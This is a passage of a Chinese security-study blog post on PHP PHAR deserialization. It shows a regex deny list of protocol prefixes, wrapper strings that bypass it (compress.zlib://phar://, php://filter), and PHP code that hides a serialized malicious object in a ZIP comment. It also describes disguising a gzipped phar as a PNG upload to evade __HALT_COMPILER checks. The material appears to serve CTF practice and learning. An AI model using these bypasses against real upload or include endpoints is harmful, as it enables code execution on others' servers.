+<h3 id="绕过phar-头部关键字检测-x20"><a href="#绕过phar-头部关键字检测-x20" class="headerlink" title="绕过phar:&#x2F;&#x2F;头部关键字检测&#x20;"></a>绕过phar:&#x2F;&#x2F;头部关键字检测&#x20;</h3><p>如果后端检测参数不能以 phar 开头</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,<span class="variable">$filename</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span><br><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">// 还可以使用伪协议的方法绕过</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过-HALT-COMPILER特征检测"><a href="#绕过-HALT-COMPILER特征检测" class="headerlink" title="绕过__HALT_COMPILER特征检测"></a>绕过__HALT_COMPILER特征检测</h3><p><strong>姿势1</strong></p>
+<p>将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了<code>__HALT_COMPILER()</code>，将 phar.gz 后缀改为 png（png文件可以上传）</p>
+<p>文件上传成功后，利用文件包含漏洞包含文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_un.php?filename=phar://pic/phar.phar.gz/phar.phar</span><br><span class="line"># file_un.php中包含__destruct并且可以被触发</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>姿势2</strong></p>
+<p>我们可以将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则</p>
+<p>一个ZIP文件由三部分组成，其大致结构如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[本地文件头<span class="number">1</span> + 文件数据<span class="number">1</span> + 数据描述符<span class="number">1</span>] </span><br><span class="line">[本地文件头<span class="number">2</span> + 文件数据<span class="number">2</span> + 数据描述符<span class="number">2</span>]</span><br><span class="line">...</span><br><span class="line">[中央目录记录]</span><br><span class="line">[归档结尾记录（End of Central <span class="built_in">Directory</span> Record, EOCD）]</span><br></pre></td></tr></table></figure>
+
+<p>关键部分是 EOCD，它标志着ZIP文件的结束，并包含了定位中央目录所需的信息。EOCD的结构中有一个专门的字段用于存储归档注释。</p>
+<p><code>__HALT_COMPILER();</code> 这个危险字符串被深埋在了文件的最末尾——ZIP归档注释里。简单的基于正则表达式的扫描可能只会检查文件的前N个字节（例如检查文件头），或者不会递归地解析ZIP格式并检查其注释字段。因此，这种恶意负载很容易逃脱检测。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>); <span class="comment">// 1. 序列化恶意对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>); <span class="comment">// 2. 添加一个无害的文件</span></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>); <span class="comment">// 3. 【关键】将序列化数据设为注释</span></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>phpggc 生成 phar参考：<a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E7%82%B9">php phar 反序列化利用</a></p>
+<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image.png"></p>
+<ol>
+<li><p>上传压缩之后的包含 php 代码的 phar 文件。</p>
+</li>
+<li><p>文件名中包含 .phar，比如 test.phar.gif，或者文件路径包含.phar</p>
+</li>
+<li><p>触发文件包含：include &#x2F;xxx&#x2F;1.phar.gif</p>
+</li>
+<li><p>php 会先进行解压该 phar，解压后还原正常的 php 代码，再进行包含</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AVXVkmZLAaVQeNp/_ib3DFQ">https://mp.weixin.qq.com/s/AVXVkmZLAaVQeNp\_ib3DFQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">当include邂逅phar——DeadsecCTF2025 baby-web</a>（精研）</p>
+<p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2025/08/17/LilCTF-2025/">https://c1oudfl0w0.github.io/blog/2025/08/17/LilCTF-2025/</a></p>
+<p>@湾区杯 ez_readfile</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/3007">https://forum.butian.net/index.php/share/3007</a></p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/">https://dummykitty.github.io/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a><a class="post-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a></div><div class="post-share"><div class="social-share" data-image="https://img.shetu66.com/2023/08/03/1691035301699647.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PHP反序列化——反序列化POP</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——反序列化POPPOP1学习：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phphighlight_file(__FILE__);class Hello&#123;    public $source;    public $str;    public function __construct($name)    &#123;        $this-&gt;str=$name;    &#125;    public function __destruct()    &#123;        $this-&gt;source=$this-&gt;str;        echo $this-&gt;source;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;    ...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/" title="PHP反序列化——ThinkPHP5.1.37反序列化链路构造"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——ThinkPHP5.1.37反序列化链路构造本文转载于https://xz.aliyun.com/news/6223#toc-2，跟着师傅的文章分析 前置知识 PHP中的namespace命名空间  trait修饰符   Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制 trait这个东西的出现是为了解决php不支持多继承的问题，一般我们将一些类的公有特性提取出来写成一个trait,然后如果某个类想要使用trait中的东西，只需要使用use关键字把这个trait包含进来就行了 123456789101112trait MyTrait &#123;    public function traitMethod() &#123;        echo &quot;Trait method called&quot;;    &#125;&#125;class MyClass &#123;    use MyTrait;&#125;$obj = new MyClass();$obj-&gt;trai...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——魔术方法</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——魔术方法转载于：PHP反序列化学习 from Y4er&#x20; 序列化在了解反序列化之前我们首先要知道什么是序列化。 在php中，序列化函数是serialize()。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User&#123;    public $name;    private $sex;    protected $money = 1000;        public function __construct($data, $sex)    &#123;        $this-&gt;data = $data;        $this-&gt;sex = $sex;    &#125;&#125;$number = 66;$str = &#x27;Y4er&#x27;;$bool = true;$null = NULL;$arr = array(&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 2);$user...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——字符串逃逸</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——字符串逃逸PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且根据长度判断内容 123流内容:  s:N:&quot;[这里是 N 个字节]&quot; ;  s:4:&quot;next&quot; ; ...指针:    ^^^  ^^^^^^^^^^^^^^^^^  ^^  ^^^^^^^^^^^阶段:    读头  精读 N 字节内容     校验&quot;; 继续解析后续令牌  一旦 filter 改变了这 N 个字节“在流中的位置&#x2F;长度”，就会出现两类错位：  过滤后字符变少（shrink）：实际内容更短 → 为凑满 N，指针会“吞到”后续结构的字节里。  过滤后字符变多（expand）：实际内容更长 → 读满 N 后，理论上的 “; 还没到 → 需要我们在 payload 中预埋一处 “;，恰好落在“读满 N”后的两字节，否则报错。这样可“提前闭合”，把我们想让解析器看到的新键值对暴露在外。   过滤后字符“变少”（shrink）——吞并后续字段 典型过滤：str_replace(‘ph...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——反序列化POP</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——反序列化POPPOP1学习：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phphighlight_file(__FILE__);class Hello&#123;    public $source;    public $str;    public function __construct($name)    &#123;        $this-&gt;str=$name;    &#125;    public function __destruct()    &#123;        $this-&gt;source=$this-&gt;str;        echo $this-&gt;source;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;    ...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/" title="PHP反序列化——ThinkPHP5.1.37反序列化链路构造"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——ThinkPHP5.1.37反序列化链路构造本文转载于https://xz.aliyun.com/news/6223#toc-2，跟着师傅的文章分析 前置知识 PHP中的namespace命名空间  trait修饰符   Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制 trait这个东西的出现是为了解决php不支持多继承的问题，一般我们将一些类的公有特性提取出来写成一个trait,然后如果某个类想要使用trait中的东西，只需要使用use关键字把这个trait包含进来就行了 123456789101112trait MyTrait &#123;    public function traitMethod() &#123;        echo &quot;Trait method called&quot;;    &#125;&#125;class MyClass &#123;    use MyTrait;&#125;$obj = new MyClass();$obj-&gt;trai...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description">「Abernethy」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sebastian-AlphaX" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化——PHAR反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Phar介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">phar文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%AF%E4%BB%A5%E8%A7%A6%E5%8F%91Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84PHP%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">常见的可以触发Phar反序列化的PHP文件系统函数如下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">Phar反序列化漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">将phar伪造成其他格式的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87phar-%E5%A4%B4%E9%83%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%A3%80%E6%B5%8B-x20"><span class="toc-number">1.4.2.</span> <span class="toc-text">绕过phar:&#x2F;&#x2F;头部关键字检测 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-HALT-COMPILER%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">绕过__HALT_COMPILER特征检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行(RCE)绕过技术"/></a><div class="content"><a class="title" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术">命令执行(RCE)绕过技术</a><time datetime="2025-09-21T16:30:20.511Z" title="Created 2025-09-22 00:30:20">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——魔术方法"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法">PHP反序列化——魔术方法</a><time datetime="2025-09-21T16:24:00.575Z" title="Created 2025-09-22 00:24:00">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——字符串逃逸"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸">PHP反序列化——字符串逃逸</a><time datetime="2025-09-21T16:23:44.152Z" title="Created 2025-09-22 00:23:44">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——反序列化POP"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP">PHP反序列化——反序列化POP</a><time datetime="2025-09-21T16:23:28.021Z" title="Created 2025-09-22 00:23:28">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——PHAR反序列化"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化">PHP反序列化——PHAR反序列化</a><time datetime="2025-09-21T16:22:09.810Z" title="Created 2025-09-22 00:22:09">2025-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
